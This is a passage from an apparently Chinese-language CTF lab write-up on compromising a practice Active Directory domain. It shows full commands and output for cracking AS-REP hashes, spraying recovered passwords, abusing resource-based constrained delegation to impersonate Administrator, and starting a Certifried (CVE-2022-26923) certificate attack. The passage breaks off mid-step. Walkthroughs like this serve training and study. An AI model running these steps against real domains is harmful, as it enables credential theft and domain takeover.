+<figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs makefile">john --wordlist=/usr/share/wordlists/rockyou.txt ./hash.txt<br><span class="hljs-comment"># 或者</span><br>hashcat hash.txt /usr/share/wordlists/rockyou.txt<br><br>Using default input encoding: UTF-8<br>Loaded 2 password hashes with 2 different salts (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 256/256 AVX2 8x])<br>Will run 4 OpenMP threads<br>Press &#x27;q&#x27; or Ctrl-C to abort, almost any other key for status<br>1qaz2wsx         ($krb5asrep$23$huachunmei@XIAORANG.LAB)     <br>winniethepooh    ($krb5asrep$23$lixiuying@XIAORANG.LAB)     <br>2g 0:00:00:00 DONE (2025-08-28 21:25) 100.0g/s 153600p/s 256000c/s 256000C/s slimshady..dangerous<br>Use the <span class="hljs-string">&quot;--show&quot;</span> option to display all of the cracked passwords reliably<br>Session completed. <br>                          <br></code></pre></td></tr></table></figure>
+
+<p>获得两个明文账号和密码</p>
+<figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-symbol">lixiuying:</span>winniethepooh<br><span class="hljs-symbol">huachunmei:</span><span class="hljs-number">1</span>qaz2wsx<br></code></pre></td></tr></table></figure>
+
+<p>找一下是哪台机器的账号密码，用crackmapexec去扫描</p>
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">proxychains4 -q crackmapexec smb <span class="hljs-number">172.22</span><span class="hljs-number">.15</span><span class="hljs-number">.0</span>/<span class="hljs-number">24</span> -u <span class="hljs-string">&#x27;lixiuying&#x27;</span> -p <span class="hljs-string">&#x27;winniethepooh&#x27;</span><br>proxychains4 -q crackmapexec smb <span class="hljs-number">172.22</span><span class="hljs-number">.15</span><span class="hljs-number">.0</span>/<span class="hljs-number">24</span> -u <span class="hljs-string">&#x27;huachunmei&#x27;</span> -p <span class="hljs-string">&#x27;1qaz2wsx&#x27;</span><br><br>proxychains4 -q crackmapexec smb <span class="hljs-number">172.22</span><span class="hljs-number">.15</span><span class="hljs-number">.0</span>/<span class="hljs-number">24</span> -u <span class="hljs-string">&#x27;lixiuying&#x27;</span> -p <span class="hljs-string">&#x27;winniethepooh&#x27;</span><br>/usr/lib/python3/dist-packages/cme/cli.py:<span class="hljs-number">37</span>: SyntaxWarning: invalid <span class="hljs-keyword">escape</span> <span class="hljs-keyword">sequence</span> <span class="hljs-string">&#x27;\ &#x27;</span><br>  formatter_class=RawTextHelpFormatter)<br>/usr/lib/python3/dist-packages/cme/protocols/smb/smbexec.py:<span class="hljs-number">49</span>: SyntaxWarning: invalid <span class="hljs-keyword">escape</span> <span class="hljs-keyword">sequence</span> <span class="hljs-string">&#x27;\p&#x27;</span><br>  stringbinding = <span class="hljs-string">&#x27;ncacn_np:%s[\pipe\svcctl]&#x27;</span> % self.__host<br>/usr/lib/python3/dist-packages/cme/protocols/smb/smbexec.py:<span class="hljs-number">93</span>: SyntaxWarning: invalid <span class="hljs-keyword">escape</span> <span class="hljs-keyword">sequence</span> <span class="hljs-string">&#x27;\&#123;&#x27;</span><br>  command = self.__shell + <span class="hljs-string">&#x27;echo &#x27;</span>+ data + <span class="hljs-string">&#x27; ^&gt; \\\\127.0.0.1\\&#123;&#125;\\&#123;&#125; 2^&gt;^&amp;1 &gt; %TEMP%\&#123;&#125; &amp; %COMSPEC% /Q /c %TEMP%\&#123;&#125; &amp; %COMSPEC% /Q /c del %TEMP%\&#123;&#125;&#x27;</span>.format(self.__share_name, self.__output, self.__batchFile, self.__batchFile, self.__batchFile)<br>/usr/lib/python3/dist-packages/cme/protocols/winrm.py:<span class="hljs-number">324</span>: SyntaxWarning: invalid <span class="hljs-keyword">escape</span> <span class="hljs-keyword">sequence</span> <span class="hljs-string">&#x27;\S&#x27;</span><br>  self.conn.execute_cmd(&quot;reg save HKLM\SAM C:\\windows\\temp\\SAM &amp;&amp; reg save HKLM\SYSTEM C:\\windows\\temp\\SYSTEM&quot;)<br>/usr/lib/python3/dist-packages/cme/protocols/winrm.py:<span class="hljs-number">338</span>: SyntaxWarning: invalid <span class="hljs-keyword">escape</span> <span class="hljs-keyword">sequence</span> <span class="hljs-string">&#x27;\S&#x27;</span><br>  self.conn.execute_cmd(&quot;reg save HKLM\SECURITY C:\\windows\\temp\\SECURITY &amp;&amp; reg save HKLM\SYSTEM C:\\windows\\temp\\SYSTEM&quot;)<br>SMB         <span class="hljs-number">172.22</span><span class="hljs-number">.15</span><span class="hljs-number">.13</span>    <span class="hljs-number">445</span>    XR-DC01          [*] Windows <span class="hljs-keyword">Server</span> <span class="hljs-number">2016</span> Standard <span class="hljs-number">14393</span> x64 (<span class="hljs-type">name</span>:XR-DC01) (<span class="hljs-keyword">domain</span>:xiaorang.lab) (signing:<span class="hljs-keyword">True</span>) (SMBv1:<span class="hljs-keyword">True</span>)<br>SMB         <span class="hljs-number">172.22</span><span class="hljs-number">.15</span><span class="hljs-number">.18</span>    <span class="hljs-number">445</span>    XR-CA            [*] Windows <span class="hljs-keyword">Server</span> <span class="hljs-number">2016</span> Standard <span class="hljs-number">14393</span> x64 (<span class="hljs-type">name</span>:XR-CA) (<span class="hljs-keyword">domain</span>:xiaorang.lab) (signing:<span class="hljs-keyword">False</span>) (SMBv1:<span class="hljs-keyword">True</span>)<br>SMB         <span class="hljs-number">172.22</span><span class="hljs-number">.15</span><span class="hljs-number">.24</span>    <span class="hljs-number">445</span>    XR-WIN08         [*] Windows <span class="hljs-keyword">Server</span> <span class="hljs-number">2008</span> R2 Enterprise <span class="hljs-number">7601</span> Service Pack <span class="hljs-number">1</span> x64 (<span class="hljs-type">name</span>:XR-WIN08) (<span class="hljs-keyword">domain</span>:XR-WIN08) (signing:<span class="hljs-keyword">False</span>) (SMBv1:<span class="hljs-keyword">True</span>)<br>SMB         <span class="hljs-number">172.22</span><span class="hljs-number">.15</span><span class="hljs-number">.35</span>    <span class="hljs-number">445</span>    XR<span class="hljs-number">-0687</span>          [*] Windows <span class="hljs-keyword">Server</span> <span class="hljs-number">2022</span> Build <span class="hljs-number">20348</span> x64 (<span class="hljs-type">name</span>:XR<span class="hljs-number">-0687</span>) (<span class="hljs-keyword">domain</span>:xiaorang.lab) (signing:<span class="hljs-keyword">False</span>) (SMBv1:<span class="hljs-keyword">False</span>)<br>SMB         <span class="hljs-number">172.22</span><span class="hljs-number">.15</span><span class="hljs-number">.13</span>    <span class="hljs-number">445</span>    XR-DC01          [+] xiaorang.lab\lixiuying:winniethepooh <br>SMB         <span class="hljs-number">172.22</span><span class="hljs-number">.15</span><span class="hljs-number">.18</span>    <span class="hljs-number">445</span>    XR-CA            [+] xiaorang.lab\lixiuying:winniethepooh <br>SMB         <span class="hljs-number">172.22</span><span class="hljs-number">.15</span><span class="hljs-number">.24</span>    <span class="hljs-number">445</span>    XR-WIN08         [-] XR-WIN08\lixiuying:winniethepooh STATUS_LOGON_FAILURE <br>SMB         <span class="hljs-number">172.22</span><span class="hljs-number">.15</span><span class="hljs-number">.35</span>    <span class="hljs-number">445</span>    XR<span class="hljs-number">-0687</span>          [+] xiaorang.lab\lixiuying:winniethepooh <br><br></code></pre></td></tr></table></figure>
+
+<p>尝试过后只有172.22.15.35能够登录</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">proxychains xfreerdp3 /u:huachunmei /p:1qaz2wsx /v:172.22.15.35 /cert:ignore /sec:nla /tls:seclevel:0<br></code></pre></td></tr></table></figure>
+
+<h2 id="ACL-Abuse-RBCD提权"><a href="#ACL-Abuse-RBCD提权" class="headerlink" title="ACL Abuse+RBCD提权"></a>ACL Abuse+RBCD提权</h2><p>bloodhound发现lixiuying对XR-0687具有GenericWrite权限，能打RBCD</p>
+<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs css">sudo neo4j start<br><br>./BloodHound <span class="hljs-attr">--no-sandbox</span><br><br>SharpHound<span class="hljs-selector-class">.exe</span> -c <span class="hljs-attribute">all</span><br># 或者<br>proxychains4 bloodhound-python -c <span class="hljs-attribute">all</span> -u lixiuying -<span class="hljs-selector-tag">p</span> winniethepooh -d xiaorang<span class="hljs-selector-class">.lab</span> -ns <span class="hljs-number">172.22</span>.<span class="hljs-number">15.13</span> <span class="hljs-attr">--zip</span> <span class="hljs-attr">--dns-tcp</span><br></code></pre></td></tr></table></figure>
+
+<p>基于资源的约束委派（Resource-Based Constrained Delegation，RBCD）是在Windows Server 2012中新引入的功能。与传统的约束委派相比，它将设置委派的权限交还给了服务资源自身，也就是说服务自己可以决定“谁可以对我进行委派。”基于资源的约束委派的关键在于msDS-AllowedToActOnBehalfOfOtherIdentity属性的设置。</p>
+<p>首先添加一个机器账户</p>
+<figure class="highlight oxygene"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs oxygene">proxychains impacket-addcomputer xiaorang.lab/lixiuying:<span class="hljs-string">&#x27;winniethepooh&#x27;</span> -dc-ip <span class="hljs-number">172.22</span>.<span class="hljs-number">15.13</span> -dc-host xiaorang.lab -computer-name <span class="hljs-string">&#x27;matrix$&#x27;</span> -computer-pass <span class="hljs-string">&#x27;Matrix2025!&#x27;</span><br>proxychains impacket-addcomputer -<span class="hljs-keyword">method</span> <span class="hljs-title function_">SAMR</span> <span class="hljs-title function_">xiaorang</span>.<span class="hljs-title function_">lab</span>/<span class="hljs-title function_">lixiuying</span>:winniethepooh -computer-name matrix\$ -computer-pass Matrix2025! -dc-ip <span class="hljs-number">172.22</span>.<span class="hljs-number">15.13</span><br><br>Impacket v0.<span class="hljs-number">13.0</span>.dev0 - Copyright Fortra, LLC <span class="hljs-keyword">and</span> its affiliated companies <br><br>[proxychains] <span class="hljs-keyword">Strict</span> chain  ...  <span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>:<span class="hljs-number">55556</span>  ...  <span class="hljs-number">172.22</span>.<span class="hljs-number">15.13</span>:<span class="hljs-number">135</span>  ...  OK<br>[proxychains] <span class="hljs-keyword">Strict</span> chain  ...  <span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>:<span class="hljs-number">55556</span>  ...  <span class="hljs-number">172.22</span>.<span class="hljs-number">15.13</span>:<span class="hljs-number">445</span>  ...  OK<br>[*] Successfully added machine account matrix$ <span class="hljs-keyword">with</span> password Matrix2025!.<br></code></pre></td></tr></table></figure>
+
+<h3 id="impacket-rbcd"><a href="#impacket-rbcd" class="headerlink" title="impacket-rbcd"></a>impacket-rbcd</h3><figure class="highlight oxygene"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs oxygene">proxychains4 impacket-rbcd xiaorang.lab/lixiuying:<span class="hljs-string">&#x27;winniethepooh&#x27;</span> -dc-ip <span class="hljs-number">172.22</span>.<span class="hljs-number">15.13</span> -action <span class="hljs-keyword">write</span> -<span class="hljs-keyword">delegate</span>-<span class="hljs-keyword">to</span> <span class="hljs-string">&#x27;XR-0687$&#x27;</span> -<span class="hljs-keyword">delegate</span>-<span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;matrix$&#x27;</span><br></code></pre></td></tr></table></figure>
+
+<p><code>rbcd.py</code> 是 <code>Impacket</code> 工具中的脚本，用于滥用基于资源的约束委派（Resource-Based Constrained Delegation, RBCD）</p>
+<ul>
+<li><code>-action write</code>：将委派权限写入目标机器 <code>XR-0687</code>。</li>
+<li><code>-delegate-to &#39;XR-0687</code>：指定被委派的目标为 <code>XR-0687</code>。</li>
+<li><code>-delegate-from &#39;TEST</code>：指定来源计算机账户为 <code>TEST</code>（在第一步中添加的账户）</li>
+</ul>
+<h3 id="PowerView-ps1"><a href="#PowerView-ps1" class="headerlink" title="PowerView.ps1"></a>PowerView.ps1</h3><p>这个需要rdp后，在目标机器上使用</p>
+<p>然后装一个<a target="_blank" rel="noopener" href="https://github.com/shigophilo/tools/blob/master/PowerView.ps1">PowerView.ps1</a>，rdp直接放上去，这东西用来获取机器id</p>
+<figure class="highlight mathematica"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs mathematica"><span class="hljs-built_in">Import</span><span class="hljs-operator">-</span><span class="hljs-built_in">Module</span> <span class="hljs-operator">.</span>\<span class="hljs-variable">PowerView</span><span class="hljs-operator">.</span><span class="hljs-variable">ps1</span><br><span class="hljs-built_in">Get</span><span class="hljs-operator">-</span><span class="hljs-variable">NetComputer</span> <span class="hljs-number">01</span> <span class="hljs-operator">-</span><span class="hljs-built_in">Properties</span> <span class="hljs-variable">objectsid</span><br></code></pre></td></tr></table></figure>
+
+<p>得到机器id</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">S</span>-<span class="hljs-number">1</span>-<span class="hljs-number">5</span>-<span class="hljs-number">21</span>-<span class="hljs-number">3745972894</span>-<span class="hljs-number">1678056601</span>-<span class="hljs-number">2622918667</span>-<span class="hljs-number">1147</span><br></code></pre></td></tr></table></figure>
+
+<p>修改服务资源msDS-AllowedToActOnBehalfOfOtherIdentity属性</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-variable">$SD</span> = <span class="hljs-built_in">New-Object</span> Security.AccessControl.RawSecurityDescriptor <span class="hljs-literal">-ArgumentList</span> <span class="hljs-string">&quot;O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-3745972894-1678056601-2622918667-1147)&quot;</span>;<span class="hljs-variable">$SDBytes</span> = <span class="hljs-built_in">New-Object</span> byte[] (<span class="hljs-variable">$SD</span>.BinaryLength);<span class="hljs-variable">$SD</span>.GetBinaryForm(<span class="hljs-variable">$SDBytes</span>, <span class="hljs-number">0</span>);<span class="hljs-built_in">Get-DomainComputer</span> XR<span class="hljs-literal">-0687</span> | <span class="hljs-built_in">Set-DomainObject</span> <span class="hljs-literal">-Set</span> <span class="hljs-selector-tag">@</span>&#123;<span class="hljs-string">&#x27;msds-allowedtoactonbehalfofotheridentity&#x27;</span>=<span class="hljs-variable">$SDBytes</span>&#125; <span class="hljs-literal">-Verbose</span><br></code></pre></td></tr></table></figure>
+
+<p>或者还有这种操作，太麻烦了：<a target="_blank" rel="noopener" href="https://blog.csdn.net/longlangci/article/details/131686439">https://blog.csdn.net/longlangci/article/details/131686439</a></p>
+<p>回到Kali，创建票据</p>
+<blockquote>
+<p>使用 impacket 的 getST执行基于资源的约束性委派工具并获取拥有访问XR-0687机器上的GIFS服务的高权限票据。</p>
+</blockquote>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs stylus">proxychains4 impacket-getST xiaorang.lab/matrix$:Matrix2025! -spn cifs/XR-<span class="hljs-number">0687</span><span class="hljs-selector-class">.xiaorang</span><span class="hljs-selector-class">.lab</span> -impersonate administrator -dc-ip <span class="hljs-number">172.22</span>.<span class="hljs-number">15.13</span> <br>proxychains4 impacket-getST xiaorang.lab/<span class="hljs-string">&#x27;matrix$&#x27;</span>:<span class="hljs-string">&#x27;Matrix2025!&#x27;</span> -spn cifs/XR-<span class="hljs-number">0687</span><span class="hljs-selector-class">.xiaorang</span><span class="hljs-selector-class">.lab</span> -impersonate Administrator -dc-ip <span class="hljs-number">172.22</span>.<span class="hljs-number">15.13</span><br>Impacket v0.<span class="hljs-number">13.0</span><span class="hljs-selector-class">.dev0</span> - Copyright Fortra, LLC and its affiliated companies <br><br><span class="hljs-selector-attr">[-]</span> CCache file is not found. Skipping...<br><span class="hljs-selector-attr">[*]</span> Getting TGT <span class="hljs-keyword">for</span> user<br><span class="hljs-selector-attr">[proxychains]</span> Strict chain  ...  <span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>:<span class="hljs-number">55556</span>  ...  <span class="hljs-number">172.22</span>.<span class="hljs-number">15.13</span>:<span class="hljs-number">88</span>  ...  OK<br><span class="hljs-selector-attr">[proxychains]</span> Strict chain  ...  <span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>:<span class="hljs-number">55556</span>  ...  <span class="hljs-number">172.22</span>.<span class="hljs-number">15.13</span>:<span class="hljs-number">88</span>  ...  OK<br><span class="hljs-selector-attr">[*]</span> Impersonating administrator<br><span class="hljs-selector-attr">[*]</span> Requesting S4U2self<br><span class="hljs-selector-attr">[proxychains]</span> Strict chain  ...  <span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>:<span class="hljs-number">55556</span>  ...  <span class="hljs-number">172.22</span>.<span class="hljs-number">15.13</span>:<span class="hljs-number">88</span>  ...  OK<br><span class="hljs-selector-attr">[*]</span> Requesting S4U2Proxy<br><span class="hljs-selector-attr">[proxychains]</span> Strict chain  ...  <span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>:<span class="hljs-number">55556</span>  ...  <span class="hljs-number">172.22</span>.<span class="hljs-number">15.13</span>:<span class="hljs-number">88</span>  ...  OK<br><span class="hljs-selector-attr">[*]</span> Saving ticket <span class="hljs-keyword">in</span> administrator@cifs_XR-<span class="hljs-number">0687</span><span class="hljs-selector-class">.xiaorang</span>.lab@XIAORANG<span class="hljs-selector-class">.LAB</span><span class="hljs-selector-class">.ccache</span><br>administrator@cifs_XR-<span class="hljs-number">0687</span><span class="hljs-selector-class">.xiaorang</span>.lab@XIAORANG<span class="hljs-selector-class">.LAB</span>.ccach<br></code></pre></td></tr></table></figure>
+
+<p>Kali导入刚刚生成的票据</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-built_in">export</span> <span class="hljs-attribute">KRB5CCNAME</span>=Administrator@cifs_XR-0687.xiaorang.lab@XIAORANG.LAB.ccache<br></code></pre></td></tr></table></figure>
+
+<p>然后其实应该能连上去了，但被拒绝了，票据生成了但能访问失败</p>
+<p>解决办法是改host</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> vim /etc/hosts<br></code></pre></td></tr></table></figure>
+
+<p>使用申请的票据获取XR-0687这台机器的本地管理员权限，注意文件名对应</p>
+<figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs gherkin">proxychains impacket-psexec Administrator<span class="hljs-meta">@XR-0687.xiaorang.lab</span> -k -no-pass -dc-ip 172.22.15.13<br><br>C:\Windows\system32&gt; type C:\Users\Administrator\flag\flag03.txt<br>  __ _            __ ____<br> / _|<span class="hljs-string"> </span>|<span class="hljs-string">__ _ __ _ /  \__ /</span><br><span class="hljs-string"></span>|<span class="hljs-string">  _</span>|<span class="hljs-string"> / _` / _` </span>|<span class="hljs-string"> () </span>|<span class="hljs-string">_ \</span><br><span class="hljs-string"></span>|<span class="hljs-string">_</span>|<span class="hljs-string"> </span>|<span class="hljs-string">_\__,_\__, </span>|<span class="hljs-string">\__/___/</span><br><span class="hljs-string">           </span>|<span class="hljs-string">___/         </span><br><span class="hljs-string"></span><br><span class="hljs-string">flag03: flag&#123;85f1e9f3-8f15-4ab4-91a0-70ff52e5be41&#125;</span><br></code></pre></td></tr></table></figure>
+
+<h1 id="flag4"><a href="#flag4" class="headerlink" title="flag4"></a>flag4</h1><h2 id="CVE-2022-26923"><a href="#CVE-2022-26923" class="headerlink" title="CVE-2022-26923"></a>CVE-2022-26923</h2><p>2022年5月10日，微软发布补丁修复了一个Active Directory域权限提升漏洞（CVE-2022-26923）。该漏洞是由于对用户属性的不正确获取，允许低权限用户在安装了Active Directory证书服务（AD CS）的域环境中将权限提升至域管理员。</p>
+<blockquote>
+<p>默认情况下，域用户账户可以注册User证书模板，计算机账户可以注册Machine证书模板。两个证书模板都允许执行客户端身份验证。<br>在申请计算机证书时，ADCS将计算机对象的dNSHostName属性的值添加到证书的主题备用名称中。当我们使用证书进行身份验证是，KDC会尝试将这个dNSHOstName属性值从证书映射到目标账户。<br>因此，如果我们将某个可控计算机账户（Test1$）的dNSHostName值改为与域控制器的计算机账户相同的dNSHostName值，那么就意味着我们可以欺骗ADCS，并最终申请到域控制器的AD证书。</p>
+</blockquote>
+<p>这里要打的其实还是Certifried (CVE-2022–26923)，是一个nday，之前靶场打过，不过考察的是<code>KDC_ERR_PADATA_TYPE_NOSUPP</code>出错情况下的打法。</p>
+<p>首先添加用户</p>
+<p>certipy是打CVE-2022–26923的工具：<a target="_blank" rel="noopener" href="https://github.com/ly4k/Certipy/%EF%BC%8C%E4%BD%86%E6%98%AFKali%E6%9C%AC%E6%9D%A5%E5%86%85%E7%BD%AE%E7%9A%84certipy-ad%EF%BC%8C%E6%95%88%E6%9E%9C%E4%B8%80%E6%A0%B7">https://github.com/ly4k/Certipy/，但是Kali本来内置的certipy-ad，效果一样</a></p>
+<p>新建一个用户</p>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs stylus">proxychains certipy-ad account create -user <span class="hljs-string">&#x27;matrix1$&#x27;</span> -pass <span class="hljs-string">&#x27;Matrix2025!&#x27;</span> -dns XR-DC01<span class="hljs-selector-class">.xiaorang</span><span class="hljs-selector-class">.lab</span> -dc-ip <span class="hljs-number">172.22</span>.<span class="hljs-number">15.13</span> -u lixiuying -<span class="hljs-selector-tag">p</span> <span class="hljs-string">&#x27;winniethepooh&#x27;</span><br>proxychains certipy-ad account create -user <span class="hljs-string">&#x27;matrix1$&#x27;</span> -pass <span class="hljs-string">&#x27;Matrix2025!&#x27;</span> -dns XR-DC01<span class="hljs-selector-class">.xiaorang</span><span class="hljs-selector-class">.lab</span> -dc-ip <span class="hljs-number">172.22</span>.<span class="hljs-number">15.13</span> -u lixiuying -<span class="hljs-selector-tag">p</span> <span class="hljs-string">&#x27;winniethepooh&#x27;</span><br><span class="hljs-selector-attr">[proxychains]</span> config file found: /etc/proxychains4<span class="hljs-selector-class">.conf</span><br><span class="hljs-selector-attr">[proxychains]</span> preloading /usr/lib/x86_64-linux-gnu/libproxychains<span class="hljs-selector-class">.so</span>.<span class="hljs-number">4</span><br><span class="hljs-selector-attr">[proxychains]</span> DLL init: proxychains-ng <span class="hljs-number">4.17</span><br>Certipy v5.<span class="hljs-number">0.2</span> - by Oliver Lyak (ly4k)<br><br><span class="hljs-selector-attr">[proxychains]</span> Strict chain  ...  <span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>:<span class="hljs-number">55556</span>  ...  <span class="hljs-number">172.22</span>.<span class="hljs-number">15.13</span>:<span class="hljs-number">636</span>  ...  OK<br><span class="hljs-selector-attr">[*]</span> Creating new account:<br>    sAMAccountName                      : matrix1$<br>    unicodePwd                          : Matrix2025!<br>    userAccountControl                  : <span class="hljs-number">4096</span><br>    servicePrincipalName                : HOST/matrix1<br>                                          RestrictedKrbHost/matrix1<br>    dnsHostName                         : XR-DC01<span class="hljs-selector-class">.xiaorang</span><span class="hljs-selector-class">.lab</span><br><span class="hljs-selector-attr">[*]</span> Successfully created account <span class="hljs-string">&#x27;matrix1$&#x27;</span> with password <span class="hljs-string">&#x27;Matrix2025!&#x27;</span><br></code></pre></td></tr></table></figure>
+
+<p>添加成功说明漏洞存在，继续按流程走，申请证书模版，这里有点怪，第一次打完超时了，第二次打打出来了</p>
+<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">proxychains</span> certipy-ad req -u <span class="hljs-string">&#x27;matrix1$<span class="hljs-variable">@xiaorang</span>.lab&#x27;</span> -p <span class="hljs-string">&#x27;Matrix2025!&#x27;</span> -ca <span class="hljs-string">&#x27;xiaorang-XR-CA-CA&#x27;</span> -target <span class="hljs-number">172.22.15.18</span> -template <span class="hljs-string">&#x27;Machine&#x27;</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152211293.png" srcset="/img/loading.gif" lazyload alt="image-20250828231241832"></p>
+<p>按流程走，但这一步会出现报错：</p>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs stylus">proxychains certipy-ad auth -pfx xr-dc01<span class="hljs-selector-class">.pfx</span> -dc-ip <span class="hljs-number">172.22</span>.<span class="hljs-number">15.13</span><br><br><span class="hljs-selector-attr">[proxychains]</span> config file found: /etc/proxychains4<span class="hljs-selector-class">.conf</span><br><span class="hljs-selector-attr">[proxychains]</span> preloading /usr/lib/x86_64-linux-gnu/libproxychains<span class="hljs-selector-class">.so</span>.<span class="hljs-number">4</span><br><span class="hljs-selector-attr">[proxychains]</span> DLL init: proxychains-ng <span class="hljs-number">4.17</span><br>Certipy v5.<span class="hljs-number">0.2</span> - by Oliver Lyak (ly4k)<br><br><span class="hljs-selector-attr">[*]</span> Certificate identities:<br><span class="hljs-selector-attr">[*]</span>     SAN DNS Host Name: <span class="hljs-string">&#x27;XR-DC01.xiaorang.lab&#x27;</span><br><span class="hljs-selector-attr">[*]</span> Using principal: <span class="hljs-string">&#x27;xr-dc01$@xiaorang.lab&#x27;</span><br><span class="hljs-selector-attr">[*]</span> Trying to get TGT...<br><span class="hljs-selector-attr">[proxychains]</span> Strict chain  ...  <span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>:<span class="hljs-number">55556</span>  ...  <span class="hljs-number">172.22</span>.<span class="hljs-number">15.13</span>:<span class="hljs-number">88</span>  ...  OK<br><span class="hljs-selector-attr">[-]</span> Got error while trying to request TGT: Kerberos SessionError: <span class="hljs-built_in">KDC_ERR_PADATA_TYPE_NOSUPP</span>(KDC has no support <span class="hljs-keyword">for</span> padata type)<br><span class="hljs-selector-attr">[-]</span> Use -debug to print <span class="hljs-selector-tag">a</span> stacktrace<br><span class="hljs-selector-attr">[-]</span> See the wiki <span class="hljs-keyword">for</span> more information<br></code></pre></td></tr></table></figure>
+
+<p>然后这里的报错是因为 <code>域控制器没有安装用于智能卡身份验证的证书</code>，具体分析可以看whoami师傅的<a target="_blank" rel="noopener" href="https://whoamianony.top/posts/pass-the-certificate-when-pkinit-is-nosupp/">博客</a>。</p>
+<p>但这个博客上的似乎不可行，可以看看x1r0z的博客，尝试 Schannel，通过 Schannel将证书传递到 LDAPS，修改 LDAP 配置 (例如配置 RBCD &#x2F; DCSync)，进而获得域控权限。</p>
+<p>这样打首先得把pfx导出为.key 和.crt 两个文件(让你输入密码直接回车即可，空密码)：</p>
